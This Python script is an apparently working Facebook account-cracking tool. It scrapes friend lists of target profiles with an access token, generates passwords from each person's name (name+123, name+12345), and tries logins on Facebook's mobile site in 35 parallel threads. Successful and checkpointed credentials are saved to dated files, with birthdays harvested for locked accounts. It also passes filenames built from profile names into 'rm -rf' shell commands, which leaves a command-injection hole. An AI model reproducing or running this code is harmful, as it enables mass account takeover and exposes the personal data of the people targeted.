#!/usr/bin/python3
#-*-coding:utf-8-*-
# Base Code Premium & Elite Dapunta
# DV Shanto Ahmed 

# Import Module
import requests,bs4,sys,os,random,time,re,json,concurrent
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import datetime

# Files
host = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []

#peler = random.choice(['\x1b[0;97m[CP]','\x1b[0;92m[OK]','\x1b[0;97m[CP]'])

# Time
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
durasi = str(datetime.now().strftime("%d %B %Y"))
try:
    if bu < 0 or bu > 12:
        exit()
    buTemp = bu - 1
except ValueError:
    exit()
op = bulan[buTemp]
tanggal = ("%s-%s-%s"%(ha,op,ta))

# Logger Cookies (Jangan Diganti Nanti Gaada Hasil)
def lang(cookies):
    f=False
    rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
    for i in rr.find_all("a",href=True):
        if "id_ID" in i.get("href"):
            requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
            b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text    
            if "apa yang anda pikirkan sekarang" in b.lower():
                f=True
    if f==True:
        return True
    else:
        exit("[!] Wrong Cookies")
def basecookie():
    if os.path.exists(".cok"):
        if os.path.getsize(".cok") !=0:
            return gets_dict_cookies(open('.cok').read().strip())
        else:login()
    else:login()
def hdcok():
    global host
    hosts=host
    r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
    return r
def gets_cookies(cookies):
    result=[]
    for i in enumerate(cookies.keys()):
        if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
    return "".join(result)
def gets_dict_cookies(cookies):
    result={}
    try:
        for i in cookies.split(";"):
            result.update({i.split("=")[0]:i.split("=")[1]})
        return result
    except:
        for i in cookies.split("; "):
            result.update({i.split("=")[0]:i.split("=")[1]})
        return result
# Login Token
def login():
    os.system('clear')
    token = input('Token : ')
    try:
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
        xd = open("token.txt", "w")
        xd.write(token)
        xd.close()
        print('Login Sukses')
        publik()
    except (KeyError,IOError):
        print('Token Invalid')
        os.system('rm -rf token.txt')
        login()
    except requests.exceptions.ConnectionError:
        print('Koneksi Error')
        os.system('rm -rf token.txt')
        login()

# Dump ID Dari Teman/Publik
def publik():
    os.system("clear")
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        print("Cookie/Token Invalid")
        os.system("rm -rf token.txt")
        login()
    nf = input('Nama File : ')
    idt1 = input("ID Target 1 : ")
    idt2 = input("ID Target 2 : ")
    idt3 = input("ID Target 3 : ")
    idt4 = input("ID Target 4 : ")
    idt5 = input("ID Target 5 : ")
    idt6 = input("ID Target 6 : ")
    idt7 = input("ID Target 7 : ")
    idt8 = input("ID Target 8 : ")
    idt9 = input("ID Target 9 : ")
    idt0 = input("ID Target 0 : ")
    print ('Slow Yoben, Patience Cok')
    try:
        rt1 = requests.get("https://graph.facebook.com/" + idt1 + "?access_token=" + token)
        rw1 = json.loads(rt1.text)
        nm1 = rw1["name"]
        r1 = requests.get("https://graph.facebook.com/" + idt1 + "/friends?limit=5000&access_token=" + token)
        id1 = []
        z1 = json.loads(r1.text)
        x1 = (rw1["first_name"]+".json").replace(" ","_")
        y1 = open(x1 , "w")
        for a1 in z1["data"]:
            id1.append(a1["id"]+"•"+a1["name"])
            y1.write(a1["id"]+"•"+a1["name"]+"\n")
        y1.close()
    except:pass
    try:
        rt2 = requests.get("https://graph.facebook.com/" + idt2 + "?access_token=" + token)
        rw2 = json.loads(rt2.text)
        nm2 = rw2["name"]
        r2 = requests.get("https://graph.facebook.com/" + idt2 + "/friends?limit=5000&access_token=" + token)
        id2 = []
        z2 = json.loads(r2.text)
        x2 = (rw2["first_name"]+".json").replace(" ","_")
        y2 = open(x2 , "w")
        for a2 in z2["data"]:
            id2.append(a2["id"]+"•"+a2["name"])
            y2.write(a2["id"]+"•"+a2["name"]+"\n")
        y2.close()
    except:pass
    try:
        rt3 = requests.get("https://graph.facebook.com/" + idt3 + "?access_token=" + token)
        rw3 = json.loads(rt3.text)
        nm3 = rw3["name"]
        r3 = requests.get("https://graph.facebook.com/" + idt3 + "/friends?limit=5000&access_token=" + token)
        id3 = []
        z3 = json.loads(r3.text)
        x3 = (rw3["first_name"]+".json").replace(" ","_")
        y3 = open(x3 , "w")
        for a3 in z3["data"]:
            id3.append(a3["id"]+"•"+a3["name"])
            y3.write(a3["id"]+"•"+a3["name"]+"\n")
        y3.close()
    except:pass
    try:
        rt4 = requests.get("https://graph.facebook.com/" + idt4 + "?access_token=" + token)
        rw4 = json.loads(rt4.text)
        nm4 = rw4["name"]
        r4 = requests.get("https://graph.facebook.com/" + idt4 + "/friends?limit=5000&access_token=" + token)
        id4 = []
        z4 = json.loads(r4.text)
        x4 = (rw4["first_name"]+".json").replace(" ","_")
        y4 = open(x4 , "w")
        for a4 in z4["data"]:
            id4.append(a4["id"]+"•"+a4["name"])
            y4.write(a4["id"]+"•"+a4["name"]+"\n")
        y4.close()
    except:pass
    try:
        rt5 = requests.get("https://graph.facebook.com/" + idt5 + "?access_token=" + token)
        rw5 = json.loads(rt5.text)
        nm5 = rw5["name"]
        r5 = requests.get("https://graph.facebook.com/" + idt5 + "/friends?limit=5000&access_token=" + token)
        id5 = []
        z5 = json.loads(r5.text)
        x5 = (rw5["first_name"]+".json").replace(" ","_")
        y5 = open(x5 , "w")
        for a5 in z5["data"]:
            id5.append(a5["id"]+"•"+a5["name"])
            y5.write(a5["id"]+"•"+a5["name"]+"\n")
        y5.close()
    except:pass
    try:
        rt6 = requests.get("https://graph.facebook.com/" + idt6 + "?access_token=" + token)
        rw6 = json.loads(rt6.text)
        nm6 = rw6["name"]
        r6 = requests.get("https://graph.facebook.com/" + idt6 + "/friends?limit=5000&access_token=" + token)
        id6 = []
        z6 = json.loads(r6.text)
        x6 = (rw6["first_name"]+".json").replace(" ","_")
        y6 = open(x6 , "w")
        for a6 in z6["data"]:
            id6.append(a6["id"]+"•"+a6["name"])
            y6.write(a6["id"]+"•"+a6["name"]+"\n")
        y6.close()
    except:pass
    try:
        rt7 = requests.get("https://graph.facebook.com/" + idt7 + "?access_token=" + token)
        rw7 = json.loads(rt7.text)
        nm7 = rw7["name"]
        r7 = requests.get("https://graph.facebook.com/" + idt7 + "/friends?limit=5000&access_token=" + token)
        id7 = []
        z7 = json.loads(r7.text)
        x7 = (rw7["first_name"]+".json").replace(" ","_")
        y7 = open(x7 , "w")
        for a7 in z7["data"]:
            id7.append(a7["id"]+"•"+a7["name"])
            y7.write(a7["id"]+"•"+a7["name"]+"\n")
        y7.close()
    except:pass
    try:
        rt8 = requests.get("https://graph.facebook.com/" + idt8 + "?access_token=" + token)
        rw8 = json.loads(rt8.text)
        nm8 = rw8["name"]
        r8 = requests.get("https://graph.facebook.com/" + idt8 + "/friends?limit=5000&access_token=" + token)
        id8 = []
        z8 = json.loads(r8.text)
        x8 = (rw8["first_name"]+".json").replace(" ","_")
        y8 = open(x8 , "w")
        for a8 in z8["data"]:
            id8.append(a8["id"]+"•"+a8["name"])
            y8.write(a8["id"]+"•"+a8["name"]+"\n")
        y8.close()
    except:pass
    try:
        rt9 = requests.get("https://graph.facebook.com/" + idt9 + "?access_token=" + token)
        rw9 = json.loads(rt9.text)
        nm9 = rw9["name"]
        r9 = requests.get("https://graph.facebook.com/" + idt9 + "/friends?limit=5000&access_token=" + token)
        id9 = []
        z9 = json.loads(r9.text)
        x9 = (rw9["first_name"]+".json").replace(" ","_")
        y9 = open(x9 , "w")
        for a9 in z9["data"]:
            id9.append(a9["id"]+"•"+a9["name"])
            y9.write(a9["id"]+"•"+a9["name"]+"\n")
        y9.close()
    except:pass
    try:
        rt0 = requests.get("https://graph.facebook.com/" + idt0 + "?access_token=" + token)
        rw0 = json.loads(rt0.text)
        nm0 = rw0["name"]
        r0 = requests.get("https://graph.facebook.com/" + idt0 + "/friends?limit=5000&access_token=" + token)
        id0 = []
        z0 = json.loads(r0.text)
        x0 = (rw0["first_name"]+".json").replace(" ","_")
        y0 = open(x0 , "w")
        for a0 in z0["data"]:
            id0.append(a0["id"]+"•"+a0["name"])
            y0.write(a0["id"]+"•"+a0["name"]+"\n")
        y0.close()
    except:pass
    try:
        nma1 = requests.get("https://graph.facebook.com/%s/?access_token=%s"%(idt1,token)).json()["first_name"]
        sd1 = (nma1+".json").replace(" ","_")
        dm1 = open(sd1,"r").read()
    except (KeyError,IOError):
        dm1 = '\n'
        sd1 = 'none'
    try:
        nma2 = requests.get("https://graph.facebook.com/%s/?access_token=%s"%(idt2,token)).json()["first_name"]
        sd2 = (nma2+".json").replace(" ","_")
        dm2 = open(sd2,"r").read()
    except (KeyError,IOError):
        dm2 = '\n'
        sd2 = 'none'
    try:
        nma3 = requests.get("https://graph.facebook.com/%s/?access_token=%s"%(idt3,token)).json()["first_name"]
        sd3 = (nma3+".json").replace(" ","_")
        dm3 = open(sd3,"r").read()
    except (KeyError,IOError):
        dm3 = '\n'
        sd3 = 'none'
    try:
        nma4 = requests.get("https://graph.facebook.com/%s/?access_token=%s"%(idt4,token)).json()["first_name"]
        sd4 = (nma4+".json").replace(" ","_")
        dm4 = open(sd4,"r").read()
    except (KeyError,IOError):
        dm4 = '\n'
        sd4 = 'none'
    try:
        nma5 = requests.get("https://graph.facebook.com/%s/?access_token=%s"%(idt5,token)).json()["first_name"]
        sd5 = (nma5+".json").replace(" ","_")
        dm5 = open(sd5,"r").read()
    except (KeyError,IOError):
        dm5 = '\n'
        sd5 = 'none'
    try:
        nma6 = requests.get("https://graph.facebook.com/%s/?access_token=%s"%(idt6,token)).json()["first_name"]
        sd6 = (nma6+".json").replace(" ","_")
        dm6 = open(sd6,"r").read()
    except (KeyError,IOError):
        dm6 = '\n'
        sd6 = 'none'
    try:
        nma7 = requests.get("https://graph.facebook.com/%s/?access_token=%s"%(idt7,token)).json()["first_name"]
        sd7 = (nma7+".json").replace(" ","_")
        dm7 = open(sd7,"r").read()
    except (KeyError,IOError):
        dm7 = '\n'
        sd7 = 'none'
    try:
        nma8 = requests.get("https://graph.facebook.com/%s/?access_token=%s"%(idt8,token)).json()["first_name"]
        sd8 = (nma8+".json").replace(" ","_")
        dm8 = open(sd8,"r").read()
    except (KeyError,IOError):
        dm8 = '\n'
        sd8 = 'none'
    try:
        nma9 = requests.get("https://graph.facebook.com/%s/?access_token=%s"%(idt9,token)).json()["first_name"]
        sd9 = (nma9+".json").replace(" ","_")
        dm9 = open(sd9,"r").read()
    except (KeyError,IOError):
        dm9 = '\n'
        sd9 = 'none'
    try:
        nma0 = requests.get("https://graph.facebook.com/%s/?access_token=%s"%(idt0,token)).json()["first_name"]
        sd0 = (nma0+".json").replace(" ","_")
        dm0 = open(sd0,"r").read()
    except (KeyError,IOError):
        dm0 = '\n'
        sd0 = 'none'
    onf = (nf+".json").replace(" ","_")
    off = open(onf,"w")
    off.write(dm1+dm2+dm3+dm4+dm5+dm6+dm7+dm8+dm9+dm0)
    off.close()
    os.system('rm -rf %s'%(sd1))
    os.system('rm -rf %s'%(sd2))
    os.system('rm -rf %s'%(sd3))
    os.system('rm -rf %s'%(sd4))
    os.system('rm -rf %s'%(sd5))
    os.system('rm -rf %s'%(sd6))
    os.system('rm -rf %s'%(sd7))
    os.system('rm -rf %s'%(sd8))
    os.system('rm -rf %s'%(sd9))
    os.system('rm -rf %s'%(sd0))
    return crack(onf)

# Passwords
def dapuntaganteng(text):
    results=[]
    for i in text.split(" "):
        i=i.lower()
        if len(i)==1 or len(i)==2 or len(i)==3 or len(i)==4 or len(i)==5:
            results.append(i)
        else:
            results.append(i+"123")
            results.append(i+"12345")
            #results.append("786786")
            #results.append("102030")
            #results.append("203040")
    return results

# Logger Utama (Percobaan Login Setiap ID + Password)
def logger(em,pas,hosts):
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_ID;FBAV/239.0.0.10.109;]"
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}

# Proses Crack (Seleksi Login)
class crack:
    # Pemisahan ID & Password
    def __init__(self,files):
        self.ada = []
        self.cp = []
        self.ko = 0
        while True:
            try:
                while True:
                    try:
                        self.apk=files
                        self.fs=open(self.apk).read().splitlines()
                        break
                    except Exception as e:
                        print("Error : %s"%(e))
                        continue
                self.fl=[]
                for i in self.fs:
                    try:
                        self.fl.append({"id":i.split("•")[0],"pw":dapuntaganteng(i.split("•")[1])})
                    except:continue
            except Exception as e:
                print("Error : %s"%(e))
            print('\nCrack Starts...')
            print('Account [OK] Saved To OK/%s.txt'%(tanggal))
            print('Account [CP] Saved To CP/%s.txt\n'%(tanggal))
            ThreadPool(35).map(self.mulai,self.fl)
            os.remove(self.apk)
            exit()
            break
    # Selektor Login
    def mulai(self,fl):
        try:
            for i in fl.get("pw"):
                log = logger(fl.get("id"),
                    i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        print("\r\x1b[0;97m[CP] %s • %s • %s %s %s   \x1b[0;97m"%(fl.get("id"),i,d,m,y))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        open("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    print("\r\x1b[0;97m[CP] %s • %s               \x1b[0;97m"%(fl.get("id"),i))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    print("\r\x1b[0;92m[OK] %s • %s               \x1b[0;97m"%(fl.get("id"),i))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
            self.ko+=1
            print("\r[Crack][%s/%s][OK:%s][CP:%s]"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.mulai(fl)

# Penghitungan Hasil
def results(Dapunta,Krahkrah):
        if len(Dapunta) !=0:
                print(("[OK] : "+str(len(Dapunta))))
        if len(Krahkrah) !=0:
                print(("[CP] : "+str(len(Krahkrah))))
        if len(Dapunta) ==0 and len(Krahkrah) ==0:
                print("\n")
                print('Tidak Ada Hasil')

# Trigger Utama
if __name__=="__main__":
	publik()
